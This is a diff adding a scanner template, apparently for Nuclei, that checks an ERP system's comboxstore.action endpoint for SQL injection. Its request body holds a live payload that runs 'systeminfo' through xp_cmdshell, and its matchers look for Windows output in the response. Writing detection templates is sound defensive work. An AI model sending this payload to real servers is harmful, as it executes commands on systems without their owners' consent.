@@ -1,0 +1,29 @@
+id: erp-system-sql-injection
+info:
+  name: ERP System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,erp
+  description: |
+    SQL Injection vulnerability in ERP system allows remote code execution by leveraging xp_cmdshell.
+http:
+  - raw:
+      - |
+        POST /mainFunctions/comboxstore.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        comboxsql=exec%20xp_cmdshell%20'systeminfo'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Microsoft Windows"
+          - "NOListItemPersonalFilledAll"
+        part: body
+      - type: dsl
+        dsl:
+          - duration > 2
